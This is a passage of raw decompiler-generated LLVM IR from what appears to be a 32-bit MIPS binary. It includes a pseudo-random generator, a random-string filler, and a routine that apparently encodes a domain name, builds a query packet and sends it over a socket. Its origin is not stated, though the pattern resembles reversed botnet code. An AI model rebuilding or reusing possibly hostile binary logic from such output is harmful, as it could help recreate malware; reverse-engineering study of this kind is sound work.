  store i32 %v1_401c38, i32* %v1.global-to-local, align 4
  %v2_401c3c = or i32 %v1_401c34, %v1_401c38
  %v1_401c40 = icmp ult i32 %v2_401c3c, 1025
  %v2_401c40 = zext i1 %v1_401c40 to i32
  store i32 %v2_401c40, i32* %v0.global-to-local, align 4
  %v8_401c44 = trunc i32 %v2_401c3c to i16
  store i16 %v8_401c44, i16* %stack_var_-1384, align 2
  br i1 %v1_401c40, label %dec_label_pc_401c34.dec_label_pc_401c70_crit_edge, label %dec_label_pc_401c48

dec_label_pc_401c34.dec_label_pc_401c70_crit_edge: ; preds = %dec_label_pc_401c34
  %v3_401c78.pre = load i32, i32* @global_var_4498d8.107, align 4
  br label %dec_label_pc_401c70

dec_label_pc_401c48:                              ; preds = %dec_label_pc_401c34
  %v3_401c4c = load i32, i32* @global_var_449b1c.60, align 4
  store i32 %v3_401c4c, i32* @t9, align 4
  %v3_401c50 = load i32, i32* @global_var_4498d8.107, align 4
  %v2_401c54 = call i32 @function_404de0(i32 %v3_401c50)
  store i32 %v2_401c54, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v0_401c6c = load i32, i32* %s5.global-to-local, align 4
  store i32 %v0_401c6c, i32* @global_var_4498d8.107, align 4
  br label %dec_label_pc_401c70

dec_label_pc_401c70:                              ; preds = %dec_label_pc_401c34.dec_label_pc_401c70_crit_edge, %dec_label_pc_401c48
  %v3_401c78 = phi i32 [ %v3_401c78.pre, %dec_label_pc_401c34.dec_label_pc_401c70_crit_edge ], [ %v0_401c6c, %dec_label_pc_401c48 ]
  store i32 0, i32* %stack_var_-1316, align 4
  %v3_401c74 = load i32, i32* @global_var_449d14.110, align 4
  store i32 %v3_401c74, i32* @t9, align 4
  store i32 %v2_4018a0, i32* @s0, align 4
  store i32 %v2_4018a0, i32* %a1.global-to-local, align 4
  %v7_401c84 = call i32 @function_405e50(i32 %v3_401c78, i32* nonnull %stack_var_-1060, i32 16386, i32 16386, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_401c84, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v1_401c90 = load i32, i32* %s5.global-to-local, align 4
  %v2_401c90 = icmp eq i32 %v7_401c84, %v1_401c90
  br i1 %v2_401c90, label %dec_label_pc_401c98, label %dec_label_pc_401cb8

dec_label_pc_401c98:                              ; preds = %dec_label_pc_401c70, %dec_label_pc_401bc4
  %v2_401c98 = load i32, i32* %stack_var_-1316, align 4
  store i32 %v2_401c98, i32* %v1.global-to-local, align 4
  %v2_401ca0 = icmp eq i32 %v2_401c98, 11
  store i32 4, i32* %v0.global-to-local, align 4
  br i1 %v2_401ca0, label %dec_label_pc_401888, label %dec_label_pc_401ca4

dec_label_pc_401ca4:                              ; preds = %dec_label_pc_401c98
  %v2_401ca8 = icmp eq i32 %v2_401c98, 4
  store i32 %v2_401888, i32* %v0.global-to-local, align 4
  br i1 %v2_401ca8, label %dec_label_pc_401cb8.thread, label %dec_label_pc_401cc0

dec_label_pc_401cb8.thread:                       ; preds = %dec_label_pc_401ca4
  store i32 %v2_40188c, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_401cf4

dec_label_pc_401cb8:                              ; preds = %dec_label_pc_401c70
  %v1_401cb8 = icmp eq i32 %v7_401c84, 0
  br i1 %v1_401cb8, label %dec_label_pc_401cc0, label %dec_label_pc_401cf4

dec_label_pc_401cc0:                              ; preds = %dec_label_pc_401c04, %dec_label_pc_401cb8, %dec_label_pc_401ca4
  %v3_401cc4 = load i32, i32* @global_var_449b1c.60, align 4
  store i32 %v3_401cc4, i32* @t9, align 4
  %v3_401cc8 = load i32, i32* @global_var_4498d8.107, align 4
  %v2_401ccc = call i32 @function_404de0(i32 %v3_401cc8)
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  store i32 -1, i32* @v0, align 4
  %v3_401cdc = load i32, i32* @global_var_449cb0.77, align 4
  store i32 %v3_401cdc, i32* @t9, align 4
  store i32 -1, i32* @global_var_4498d8.107, align 4
  %v2_401ce4 = call i32 @function_4069b0(i32 1)
  store i32 %v2_401ce4, i32* %v0.global-to-local, align 4
  %v0_401cf4.pre = load i32, i32* @gp, align 4
  br label %dec_label_pc_401cf4

dec_label_pc_401cf4:                              ; preds = %dec_label_pc_401cb8.thread, %dec_label_pc_401cb8, %dec_label_pc_401cc0
  %v0_401cf4 = phi i32 [ %v2_401528, %dec_label_pc_401cb8 ], [ %v0_401cf4.pre, %dec_label_pc_401cc0 ], [ %v2_401528, %dec_label_pc_401cb8.thread ]
  %v1_401cf4 = add i32 %v0_401cf4, -32076
  %v2_401cf4 = inttoptr i32 %v1_401cf4 to i32*
  %v3_401cf4 = load i32, i32* %v2_401cf4, align 4
  store i32 %v4_401970, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401cf4)
  %v3_401d08 = load i16, i16* %stack_var_-1384, align 2
  %v4_401d08 = sext i16 %v3_401d08 to i32
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v1_401d10 = mul nsw i32 %v4_401d08, 256
  %v1_401d14 = and i32 %v1_401d10, 65280
  store i32 %v1_401d14, i32* %v0.global-to-local, align 4
  %v1_401d18 = udiv i32 %v4_401d08, 256
  %v2_401d1c = or i32 %v1_401d14, %v1_401d18
  %v3_401d1c = trunc i32 %v2_401d1c to i16
  %v3_401d20 = load i32, i32* @global_var_4498d8.107, align 4
  %v3_401d24 = load i32, i32* @global_var_449d14.110, align 4
  store i32 %v3_401d24, i32* @t9, align 4
  store i16 %v3_401d1c, i16* %stack_var_-1384, align 2
  %v0_401d2c = load i32, i32* @s0, align 4
  store i32 %v0_401d2c, i32* %a1.global-to-local, align 4
  %v8_401d30 = inttoptr i32 %v0_401d2c to i32*
  %v9_401d30 = call i32 @function_405e50(i32 %v3_401d20, i32* %v8_401d30, i32 %v2_401d1c, i32 16384, i32 %v2_401d1c)
  store i32 %v9_401d30, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_401d40

dec_label_pc_401d40:                              ; preds = %dec_label_pc_4016b0, %dec_label_pc_401cf4
  %v4_401d60 = phi i32 [ 0, %dec_label_pc_4016b0 ], [ %v9_401d30, %dec_label_pc_401cf4 ]
  store i32 %v0_401544, i32* %s2.global-to-local, align 4
  store i32 %v0_401548, i32* %s1.global-to-local, align 4
  ret i32 %v4_401d60

; uselistorder directives
  uselistorder i32 %v2_401d1c, { 1, 0, 2 }
  uselistorder i32 %v4_401d08, { 1, 0 }
  uselistorder i32 %v1_401c38, { 1, 0 }
  uselistorder i32 %v1_401bb8, { 1, 0, 3, 2 }
  uselistorder i32 %v1_401a94, { 1, 0 }
  uselistorder i32 %v3_401b94.pre, { 1, 2, 0 }
  uselistorder i32 %v1_4019b0, { 1, 0 }
  uselistorder i32 %v3_401964, { 1, 2, 0, 3 }
  uselistorder i32 %v1_4018a8, { 1, 2, 0 }
  uselistorder i32 %v1_401894, { 0, 2, 3, 1 }
  uselistorder i32 %v4_401970, { 4, 5, 6, 0, 7, 1, 3, 2, 8 }
  uselistorder i32 %v2_401888, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_401794, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_401528, { 42, 0, 1, 41, 43, 44, 40, 39, 49, 48, 47, 46, 50, 45, 38, 2, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 51 }
  uselistorder i32* %stack_var_-1364, { 1, 0, 2 }
  uselistorder i16* %stack_var_-1384, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32* %v1.global-to-local, { 0, 1, 2, 3, 14, 15, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 16 }
  uselistorder i32* %v0.global-to-local, { 2, 1, 3, 4, 5, 6, 9, 7, 8, 14, 10, 11, 12, 13, 15, 55, 56, 57, 58, 59, 60, 16, 17, 18, 19, 20, 21, 23, 22, 32, 25, 24, 26, 27, 28, 29, 30, 31, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 61, 62, 63, 64, 0 }
  uselistorder i32* %s2.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %gp.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 40, 41, 42, 43, 8, 13, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32* %a1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 20, 21, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 22, 0 }
  uselistorder i32 16386, { 1, 2, 0 }
  uselistorder i32* @global_var_4498d8.107, { 2, 3, 4, 5, 6, 0, 7, 8, 9, 10, 11, 1 }
  uselistorder i8* @global_var_449d6c.104, { 2, 1, 0 }
  uselistorder i32 ()* @function_40450c, { 1, 0 }
  uselistorder [2 x i8]* @global_var_408568.71, { 1, 0 }
  uselistorder label %dec_label_pc_401d40, { 1, 0 }
  uselistorder label %dec_label_pc_401cf4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_401cc0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_401c70, { 1, 0 }
  uselistorder label %dec_label_pc_401c34, { 1, 0 }
  uselistorder label %dec_label_pc_401b94, { 1, 0 }
  uselistorder label %dec_label_pc_401b08, { 1, 0 }
  uselistorder label %dec_label_pc_401aac, { 1, 0 }
  uselistorder label %dec_label_pc_40199c, { 1, 0 }
  uselistorder label %dec_label_pc_401960, { 1, 0 }
  uselistorder label %dec_label_pc_4016b0, { 1, 0 }
}

define i32 @function_401d68() local_unnamed_addr {
dec_label_pc_401d68:
  %v3_401d74 = load i32, i32* @global_var_449a78.2, align 4
  %v3_401d7c = load i32, i32* @global_var_449d70.112, align 4
  %v3_401d80 = load i32, i32* @global_var_449d7c.113, align 4
  store i32 %v3_401d74, i32* @a3, align 4
  %v1_401d8c = mul i32 %v3_401d7c, 2048
  %v1_401d90 = udiv i32 %v3_401d80, 524288
  %v2_401d94 = xor i32 %v1_401d8c, %v3_401d7c
  %v2_401d98 = xor i32 %v1_401d90, %v3_401d80
  %v2_401d9c = xor i32 %v2_401d98, %v2_401d94
  %v3_401da0 = load i32, i32* @global_var_449d74.114, align 4
  %v3_401da4 = load i32, i32* @global_var_449d78.115, align 4
  %v1_401da8 = udiv i32 %v2_401d94, 256
  %v2_401dac = xor i32 %v2_401d9c, %v1_401da8
  store i32 %v3_401da0, i32* @global_var_449d70.112, align 4
  store i32 %v3_401da4, i32* @global_var_449d74.114, align 4
  store i32 %v3_401d80, i32* @global_var_449d78.115, align 4
  store i32 %v2_401dac, i32* @global_var_449d7c.113, align 4
  ret i32 %v2_401dac

; uselistorder directives
  uselistorder i32 %v2_401dac, { 1, 0 }
  uselistorder i32 %v3_401d80, { 2, 1, 0 }
  uselistorder i32 %v3_401d7c, { 1, 0 }
}

define i32 @function_401dc4(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_401dc4:
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_401dd8 = load i32, i32* @s3, align 4
  store i32 %tmp, i32* %s2.global-to-local, align 4
  store i32 %arg2, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_401df8

dec_label_pc_401df8:                              ; preds = %dec_label_pc_401df8, %dec_label_pc_401dc4
  %v1_401df8 = call i32 @function_401d68()
  store i32 %v1_401df8, i32* @v0, align 4
  %v2_401e10 = call i32 @function_403f48()
  %v5_401e18 = urem i32 %v1_401df8, %v2_401e10
  %v0_401e24 = load i32, i32* @s3, align 4
  %v1_401e24 = add i32 %v0_401e24, -26404
  %v2_401e30 = add i32 %v1_401e24, %v5_401e18
  %v1_401e34 = inttoptr i32 %v2_401e30 to i8*
  %v2_401e34 = load i8, i8* %v1_401e34, align 1
  %v2_401e3c = load i32, i32* %s2.global-to-local, align 4
  %v3_401e3c = inttoptr i32 %v2_401e3c to i8*
  store i8 %v2_401e34, i8* %v3_401e3c, align 1
  %v0_401e40 = load i32, i32* %s2.global-to-local, align 4
  %v1_401e40 = add i32 %v0_401e40, 1
  store i32 %v1_401e40, i32* %s2.global-to-local, align 4
  %v0_401e44 = load i32, i32* %s1.global-to-local, align 4
  %v1_401e44 = add i32 %v0_401e44, -1
  store i32 %v1_401e44, i32* %s1.global-to-local, align 4
  %v3_401e4c = load i32, i32* @global_var_449c74.100, align 4
  store i32 %v3_401e4c, i32* @t9, align 4
  %v3_401e50 = load i32, i32* @global_var_449a78.2, align 4
  store i32 %v3_401e50, i32* @s3, align 4
  %v2_401e54 = icmp eq i32 %v0_401e44, 0
  br i1 %v2_401e54, label %dec_label_pc_401e58, label %dec_label_pc_401df8

dec_label_pc_401e58:                              ; preds = %dec_label_pc_401df8
  store i32 %v0_401dd8, i32* @s3, align 4
  ret i32 -1
}

define i32 @function_401e78() local_unnamed_addr {
dec_label_pc_401e78:
  %v3_401e98 = load i32, i32* @global_var_449bc8.116, align 4
  store i32 %v3_401e98, i32* @t9, align 4
  %v3_401ea0 = call i32 @function_4052b0(i32* null)
  %v3_401eb4 = load i32, i32* @global_var_449ce4.117, align 4
  store i32 %v3_401eb4, i32* @t9, align 4
  store i32 %v3_401ea0, i32* @global_var_449d70.112, align 4
  %v5_401ebc = call i32 @function_404ef0()
  %v3_401ecc = load i32, i32* @global_var_449bcc.118, align 4
  store i32 %v3_401ecc, i32* @t9, align 4
  store i32 %v5_401ebc, i32* @s0, align 4
  %v2_401ed4 = call i32 @function_404f50()
  %v0_401ee0 = load i32, i32* @s0, align 4
  %v2_401ee0 = xor i32 %v0_401ee0, %v2_401ed4
  %v3_401ee4 = load i32, i32* @global_var_449b40.119, align 4
  store i32 %v3_401ee4, i32* @t9, align 4
  store i32 %v2_401ee0, i32* @global_var_449d74.114, align 4
  %v5_401eec = call i32 @function_4057c0()
  %v3_401ef8 = load i32, i32* @global_var_449d74.114, align 4
  %v2_401f00 = xor i32 %v3_401ef8, %v5_401eec
  store i32 %v2_401f00, i32* @global_var_449d7c.113, align 4
  store i32 %v5_401eec, i32* @global_var_449d78.115, align 4
  ret i32 %v5_401eec

; uselistorder directives
  uselistorder i32 %v5_401eec, { 1, 2, 0 }
}

define i32 @function_401f28(i32 %arg1) local_unnamed_addr {
dec_label_pc_401f28:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %a3.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s3.global-to-local = alloca i32, align 4
  %s4.global-to-local = alloca i32, align 4
  %s5.global-to-local = alloca i32, align 4
  %s7.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp27 = call i8 @__decompiler_undefined_function_1()
  %tmp28 = call i8 @__decompiler_undefined_function_1()
  %tmp29 = call i8 @__decompiler_undefined_function_1()
  %tmp30 = call i8 @__decompiler_undefined_function_1()
  %tmp31 = call i16 @__decompiler_undefined_function_2()
  %tmp32 = call i16 @__decompiler_undefined_function_2()
  %stack_var_-2064 = alloca i32, align 4
  %stack_var_-2065 = alloca i32, align 4
  %stack_var_-2075 = alloca i8, align 1
  %stack_var_-2077 = alloca i32, align 4
  %stack_var_-2082 = alloca i32, align 4
  %stack_var_-2084 = alloca i32, align 4
  %stack_var_-2096 = alloca i16, align 2
  %stack_var_-4296 = alloca i32, align 4
  %stack_var_-4272 = alloca i32, align 4
  %stack_var_-4288 = alloca i32, align 4
  %stack_var_-4144 = alloca i16, align 2
  %stack_var_-4132 = alloca i32, align 4
  %v1_401f30 = load i32, i32* @t9, align 4
  %v2_401f30 = add i32 %v1_401f30, 326456
  store i32 %v2_401f30, i32* %gp.global-to-local, align 4
  %v0_401f38 = load i32, i32* @ra, align 4
  %v0_401f3c = load i32, i32* @fp, align 4
  %v0_401f58 = load i32, i32* @s1, align 4
  %v0_401f5c = load i32, i32* @s0, align 4
  store i32 %arg1, i32* %s2.global-to-local, align 4
  %v2_401f6c = call i32 @function_403f48()
  store i32 %v2_401f6c, i32* %v0.global-to-local, align 4
  store i32 %v2_401f30, i32* %gp.global-to-local, align 4
  store i32 %v2_401f6c, i32* %s0.global-to-local, align 4
  %v3_401f7c = load i32, i32* @global_var_449bb0.120, align 4
  store i32 %v3_401f7c, i32* @t9, align 4
  %v3_401f84 = ptrtoint i32* %stack_var_-4132 to i32
  store i32 %v3_401f84, i32* %s5.global-to-local, align 4
  %v4_401f84 = call i32 @function_4044ac()
  store i32 %v4_401f84, i32* %v0.global-to-local, align 4
  store i32 %v2_401f30, i32* %gp.global-to-local, align 4
  %v2_401f94 = ptrtoint i16* %stack_var_-4144 to i32
  store i32 %v3_401f84, i32* %a3.global-to-local, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 46, i32* %t0.global-to-local, align 4
  br label %dec_label_pc_401fac

dec_label_pc_401fac:                              ; preds = %dec_label_pc_401ff0.dec_label_pc_401fac_crit_edge, %dec_label_pc_401f28
  %v2_401fbc = phi i32 [ %v2_401fbc11, %dec_label_pc_401ff0.dec_label_pc_401fac_crit_edge ], [ %v3_401f84, %dec_label_pc_401f28 ]
  %v4_401fb4 = phi i32 [ %v4_401fb49, %dec_label_pc_401ff0.dec_label_pc_401fac_crit_edge ], [ 0, %dec_label_pc_401f28 ]
  %v3_401fb4 = phi i32 [ %v1_401ff0, %dec_label_pc_401ff0.dec_label_pc_401fac_crit_edge ], [ 0, %dec_label_pc_401f28 ]
  %v1_401fb4 = phi i32 [ %v1_401fb4.pre, %dec_label_pc_401ff0.dec_label_pc_401fac_crit_edge ], [ 46, %dec_label_pc_401f28 ]
  %v0_401fac = phi i32 [ %v4_401ff8, %dec_label_pc_401ff0.dec_label_pc_401fac_crit_edge ], [ %v4_401f84, %dec_label_pc_401f28 ]
  %v1_401fac = inttoptr i32 %v0_401fac to i8*
  %v2_401fac = load i8, i8* %v1_401fac, align 1
  %v3_401fac = sext i8 %v2_401fac to i32
  %v2_401fb4 = icmp eq i32 %v3_401fac, %v1_401fb4
  %v5_401fb4 = sub i32 %v3_401fb4, %v4_401fb4
  store i32 %v5_401fb4, i32* %v0.global-to-local, align 4
  br i1 %v2_401fb4, label %dec_label_pc_401fb8, label %dec_label_pc_401ff0

dec_label_pc_401fb8:                              ; preds = %dec_label_pc_401fac
  %v1_401fbc = trunc i32 %v5_401fb4 to i8
  %v3_401fbc = inttoptr i32 %v2_401fbc to i8*
  store i8 %v1_401fbc, i8* %v3_401fbc, align 1
  %v0_401fc0 = load i32, i32* %s2.global-to-local, align 4
  %v1_401fc0 = load i32, i32* %a1.global-to-local, align 4
  %v2_401fc0 = add i32 %v1_401fc0, %v0_401fc0
  store i32 %v2_401fc0, i32* %a0.global-to-local, align 4
  %v0_401fc8 = load i32, i32* %a3.global-to-local, align 4
  %v1_401fc8 = add i32 %v0_401fc8, 1
  store i32 %v1_401fc8, i32* %a3.global-to-local, align 4
  br label %dec_label_pc_401fcc

dec_label_pc_401fcc:                              ; preds = %dec_label_pc_401fcc, %dec_label_pc_401fb8
  %v2_401fd4 = phi i32 [ %v1_401fd8, %dec_label_pc_401fcc ], [ %v1_401fc8, %dec_label_pc_401fb8 ]
  %v0_401fcc = phi i32 [ %v1_401fe4, %dec_label_pc_401fcc ], [ %v2_401fc0, %dec_label_pc_401fb8 ]
  %v1_401fcc = add i32 %v0_401fcc, -1
  %v2_401fcc = inttoptr i32 %v1_401fcc to i8*
  %v3_401fcc = load i8, i8* %v2_401fcc, align 1
  %v3_401fd4 = inttoptr i32 %v2_401fd4 to i8*
  store i8 %v3_401fcc, i8* %v3_401fd4, align 1
  %v0_401fd8 = load i32, i32* %a3.global-to-local, align 4
  %v1_401fd8 = add i32 %v0_401fd8, 1
  store i32 %v1_401fd8, i32* %a3.global-to-local, align 4
  %v0_401fdc = load i32, i32* %a1.global-to-local, align 4
  %v1_401fdc = load i32, i32* %a2.global-to-local, align 4
  %v2_401fdc = icmp slt i32 %v0_401fdc, %v1_401fdc
  %v3_401fdc = zext i1 %v2_401fdc to i32
  store i32 %v3_401fdc, i32* %v0.global-to-local, align 4
  %v1_401fe0 = add i32 %v0_401fdc, 1
  store i32 %v1_401fe0, i32* %v1.global-to-local, align 4
  %v0_401fe4 = load i32, i32* %a0.global-to-local, align 4
  %v1_401fe4 = add i32 %v0_401fe4, 1
  store i32 %v1_401fe4, i32* %a0.global-to-local, align 4
  store i32 %v1_401fe0, i32* %a1.global-to-local, align 4
  br i1 %v2_401fdc, label %dec_label_pc_401fcc, label %dec_label_pc_401ff0

dec_label_pc_401ff0:                              ; preds = %dec_label_pc_401fcc, %dec_label_pc_401fac
  %v0_401ff0 = phi i32 [ %v3_401fb4, %dec_label_pc_401fac ], [ %v1_401fdc, %dec_label_pc_401fcc ]
  %v2_401fbc11 = phi i32 [ %v2_401fbc, %dec_label_pc_401fac ], [ %v1_401fd8, %dec_label_pc_401fcc ]
  %v4_401fb49 = phi i32 [ %v4_401fb4, %dec_label_pc_401fac ], [ %v1_401fe0, %dec_label_pc_401fcc ]
  %v1_401ff0 = add i32 %v0_401ff0, 1
  store i32 %v1_401ff0, i32* %a2.global-to-local, align 4
  %v1_401ff4 = load i32, i32* %s0.global-to-local, align 4
  %v2_401ff4 = icmp slt i32 %v1_401ff0, %v1_401ff4
  %v2_401ff8 = load i32, i32* %s2.global-to-local, align 4
  %v4_401ff8 = add i32 %v2_401ff8, %v1_401ff0
  store i32 %v4_401ff8, i32* %v0.global-to-local, align 4
  br i1 %v2_401ff4, label %dec_label_pc_401ff0.dec_label_pc_401fac_crit_edge, label %dec_label_pc_401ffc

dec_label_pc_401ff0.dec_label_pc_401fac_crit_edge: ; preds = %dec_label_pc_401ff0
  %v1_401fb4.pre = load i32, i32* %t0.global-to-local, align 4
  br label %dec_label_pc_401fac

dec_label_pc_401ffc:                              ; preds = %dec_label_pc_401ff0
  %v3_402000 = load i32, i32* @global_var_449c74.100, align 4
  store i32 %v3_402000, i32* @t9, align 4
  store i32 %v3_401f84, i32* %v0.global-to-local, align 4
  store i32 0, i32* %stack_var_-4132, align 4
  %v4_402008 = call i32 @function_401d68()
  %v5_402008 = sext i32 %v4_402008 to i64
  %v5_402018 = mul nuw nsw i64 %v5_402008, 2147516417
  store i32 %v2_401f30, i32* %gp.global-to-local, align 4
  store i32 %v3_401f84, i32* %a0.global-to-local, align 4
  store i32 -1, i32* %s4.global-to-local, align 4
  store i32 1, i32* %s7.global-to-local, align 4
  %v1_40203424 = udiv i64 %v5_402018, 140737488355328
  %v1_402034 = trunc i64 %v1_40203424 to i32
  store i32 %v1_402034, i32* %v1.global-to-local, align 4
  %v3_402038 = add i32 %v1_402034, %v4_402008
  %v1_40203c = urem i32 %v3_402038, 65536
  store i32 %v1_40203c, i32* @v0, align 4
  %v6_402040 = trunc i32 %v3_402038 to i16
  %v7_402040 = call i32 @function_403f48()
  store i32 %v7_402040, i32* @v0, align 4
  store i32 %v2_401f30, i32* %gp.global-to-local, align 4
  store i32 %v3_401f84, i32* %a0.global-to-local, align 4
  %v2_402058 = add i32 %v7_402040, 17
  store i32 %v2_402058, i32* @fp, align 4
  %v3_402058 = call i32 @function_403f48()
  store i32 %v3_402058, i32* @v0, align 4
  store i32 %v2_401f30, i32* %gp.global-to-local, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  %v3_402068 = load i32, i32* @global_var_449c5c.121, align 4
  store i32 %v3_402068, i32* @t9, align 4
  store i32 2054, i32* %a1.global-to-local, align 4
  %v1_402070 = load i32, i32* %s5.global-to-local, align 4
  %v3_402070 = add i32 %v1_402070, %v3_402058
  store i32 %v3_402070, i32* @s0, align 4
  %v7_402070 = call i32 @function_4063f0(i64 1, i32 2054)
  store i32 %v7_402070, i32* %s3.global-to-local, align 4
  store i32 2, i32* %stack_var_-4288, align 4
  store i32 %v2_401f30, i32* %gp.global-to-local, align 4
  store i32 256, i32* %v1.global-to-local, align 4
  store i16 %v6_402040, i16* %stack_var_-4144, align 2
  %v0_4020a4 = load i32, i32* @s0, align 4
  %v1_4020a4 = add i32 %v0_4020a4, 1
  store i32 %v1_4020a4, i32* %a0.global-to-local, align 4
  store i32 4096, i32* %v0.global-to-local, align 4
  %v4_4020b4 = inttoptr i32 %v1_4020a4 to i16*
  store i16 4096, i16* %v4_4020b4, align 2
  %v0_4020b8 = load i32, i32* %v1.global-to-local, align 4
  %v1_4020b8 = trunc i32 %v0_4020b8 to i16
  %v2_4020b8 = load i32, i32* %a0.global-to-local, align 4
  %v3_4020b8 = add i32 %v2_4020b8, 2
  %v4_4020b8 = inttoptr i32 %v3_4020b8 to i16*
  store i16 %v1_4020b8, i16* %v4_4020b8, align 2
  store i32 -1, i32* @s0, align 4
  %v0_4020c0 = load i32, i32* %s4.global-to-local, align 4
  %v2_4020c0 = icmp eq i32 %v0_4020c0, -1
  br i1 %v2_4020c0, label %dec_label_pc_4020e0, label %dec_label_pc_4020c4

dec_label_pc_4020c4:                              ; preds = %dec_label_pc_401ffc
  %v3_4020c8 = load i32, i32* @global_var_449b1c.60, align 4
  store i32 %v3_4020c8, i32* @t9, align 4
  store i32 %v0_4020c0, i32* %a0.global-to-local, align 4
  %v3_4020d0 = call i32 @function_404de0(i32 %v0_4020c0)
  store i32 %v3_4020d0, i32* %v0.global-to-local, align 4
  store i32 %v2_401f30, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_4020e0

dec_label_pc_4020e0:                              ; preds = %dec_label_pc_401ffc, %dec_label_pc_4020c4
  %v3_4020e0 = load i32, i32* @global_var_449ca4.78, align 4
  store i32 %v3_4020e0, i32* @t9, align 4
  store i32 2, i32* %a0.global-to-local, align 4
  store i32 1, i32* %a1.global-to-local, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  %v4_4020ec = call i32 @function_406010(i32 2, i32 1, i32 0)
  store i32 %v4_4020ec, i32* %v0.global-to-local, align 4
  store i32 %v2_401f30, i32* %gp.global-to-local, align 4
  %v1_4020f8 = load i32, i32* @s0, align 4
  %v2_4020f8 = icmp eq i32 %v4_4020ec, %v1_4020f8
  store i32 %v4_4020ec, i32* %s4.global-to-local, align 4
  br i1 %v2_4020f8, label %dec_label_pc_402140, label %dec_label_pc_4020fc

dec_label_pc_4020fc:                              ; preds = %dec_label_pc_4020e0
  %v3_402100 = load i32, i32* @global_var_449d10.86, align 4
  store i32 %v3_402100, i32* @t9, align 4
  store i32 %v4_4020ec, i32* %a0.global-to-local, align 4
  %v2_402108 = ptrtoint i32* %stack_var_-4288 to i32
  store i32 %v2_402108, i32* %a1.global-to-local, align 4
  store i32 16, i32* @a2, align 4
  %v4_40210c = bitcast i32* %stack_var_-4288 to %sockaddr*
  %v5_40210c = call i32 @function_405cb0(i32 %v4_4020ec, %sockaddr* %v4_40210c)
  store i32 %v5_40210c, i32* %v0.global-to-local, align 4
  store i32 %v2_401f30, i32* %gp.global-to-local, align 4
  %v1_402118 = load i32, i32* @s0, align 4
  %v2_402118 = icmp eq i32 %v5_40210c, %v1_402118
  %v3_402118 = load i32, i32* %s4.global-to-local, align 4
  store i32 %v3_402118, i32* %a0.global-to-local, align 4
  br i1 %v2_402118, label %dec_label_pc_402140, label %dec_label_pc_40211c

dec_label_pc_40211c:                              ; preds = %dec_label_pc_4020fc
  %v3_402120 = load i32, i32* @global_var_449c80.106, align 4
  store i32 %v3_402120, i32* @t9, align 4
  store i32 %v2_401f94, i32* %a1.global-to-local, align 4
  %v0_402128 = load i32, i32* @fp, align 4
  store i32 %v0_402128, i32* %a2.global-to-local, align 4
  store i32 16384, i32* %a3.global-to-local, align 4
  %v6_40212c = bitcast i16* %stack_var_-4144 to i32*
  %v7_40212c = call i32 @function_405f30(i32 %v3_402118, i32* %v6_40212c, i32 %v0_402128, i32 16384, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_40212c, i32* %v0.global-to-local, align 4
  store i32 %v2_401f30, i32* %gp.global-to-local, align 4
  %v1_402138 = load i32, i32* @fp, align 4
  %v2_402138 = icmp eq i32 %v7_40212c, %v1_402138
  store i32 3, i32* @a1, align 4
  br i1 %v2_402138, label %dec_label_pc_40215c, label %dec_label_pc_402140

dec_label_pc_402140:                              ; preds = %dec_label_pc_40211c, %dec_label_pc_4020fc, %dec_label_pc_4020e0
  %v1_402140 = add i32 %v1_401f30, 294280
  %v2_402140 = inttoptr i32 %v1_402140 to i32*
  %v3_402140 = load i32, i32* %v2_402140, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_402140)
  store i32 %v2_401f30, i32* %gp.global-to-local, align 4
  %v0_402158 = load i32, i32* %s7.global-to-local, align 4
  %v1_402158 = add i32 %v0_402158, 1
  store i32 %v1_402158, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_40215c

dec_label_pc_40215c:                              ; preds = %dec_label_pc_40211c, %dec_label_pc_402140
  %v3_40215c = load i32, i32* @global_var_449b24.80, align 4
